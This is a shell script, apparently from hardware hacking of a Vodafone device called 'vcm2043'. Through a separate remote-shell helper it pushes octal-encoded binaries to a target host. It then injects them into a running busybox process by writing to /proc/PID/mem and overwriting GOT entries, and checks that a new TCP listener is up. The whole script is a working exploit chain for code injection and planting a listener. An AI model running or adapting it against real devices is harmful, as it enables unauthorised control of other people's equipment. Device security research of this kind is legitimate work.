#!/bin/sh
set -eu
host="${1:-192.168.100.11}"
image=vcm2043_probe.bin
bootstrap=vcm2043_probe_bootstrap.bin
octal=$(od -An -v -to1 "$image" | tr -s ' ' '\n' | sed '/^$/d;s/^/\\/' | tr -d '\n')
boot_octal=$(od -An -v -to1 "$bootstrap" | tr -s ' ' '\n' | sed '/^$/d;s/^/\\/' | tr -d '\n')
{
 sleep 2
 # Minimal valid PCM WAV: RIFF/WAVE, mono, 8-bit, 8 kHz, eight silent samples.
 printf ': >/tmp/vcm2043_probe.bin; /bin/busybox rm -f /tmp/vcm2043_probe.log; printf '\''\\122\\111\\106\\106\\054\\000\\000\\000\\127\\101\\126\\105\\146\\155\\164\\040\\020\\000\\000\\000\\001\\000\\001\\000\\100\\037\\000\\000\\100\\037\\000\\000\\001\\000\\010\\000\\144\\141\\164\\141\\010\\000\\000\\000\\200\\200\\200\\200\\200\\200\\200\\200'\'' >/tmp/vcm2043_canary.txt\n'
 printf '%s\n' "$octal" | fold -w 768 | while IFS= read -r chunk; do printf "printf '%s' >>/tmp/vcm2043_probe.bin\n" "$chunk"; done
 printf "printf '%s' >/tmp/vcm2043_bootstrap.bin\n" "$boot_octal"
 printf '%s\n' '/bin/dd if=/dev/zero of=/dev/null bs=4096 & p=$!; /bin/sleep 1; kill -STOP $p; base=$(/usr/bin/awk '\''$6=="/bin/busybox"&&$3=="00000000"{split($1,a,"-");print a[1];exit}'\'' /proc/$p/maps); image=$((0x$base+0x74000)); rgot=$((0x$base+0x8fb08)); wgot=$((0x$base+0x8fdf4)); /bin/dd if=/tmp/vcm2043_probe.bin of=/proc/$p/mem bs=1 seek=$image conv=notrunc; /bin/dd if=/tmp/vcm2043_bootstrap.bin of=/proc/$p/mem bs=1 seek=$image conv=notrunc; printf "\\$(printf %03o $((image&255)))\\$(printf %03o $(((image>>8)&255)))\\$(printf %03o $(((image>>16)&255)))\\$(printf %03o $(((image>>24)&255)))" >/tmp/vcm2043_pointer.bin; /bin/dd if=/tmp/vcm2043_pointer.bin of=/proc/$p/mem bs=1 seek=$rgot conv=notrunc; /bin/dd if=/tmp/vcm2043_pointer.bin of=/proc/$p/mem bs=1 seek=$wgot conv=notrunc; kill -CONT $p; /bin/sleep 3; /bin/cat /tmp/vcm2043_probe.log; /usr/bin/awk '\''$2~/:07FB$/&&$4=="0A"{print "LISTENER_OK",$8,$10}'\'' /proc/net/tcp; kill -KILL $p 2>/dev/null || true; /bin/busybox rm -f /tmp/vcm2043_probe.bin /tmp/vcm2043_bootstrap.bin /tmp/vcm2043_pointer.bin /tmp/vcm2043_canary.txt'
 sleep 7
} | timeout 25 ./vodafone-direct-shell.sh "$host" 9536
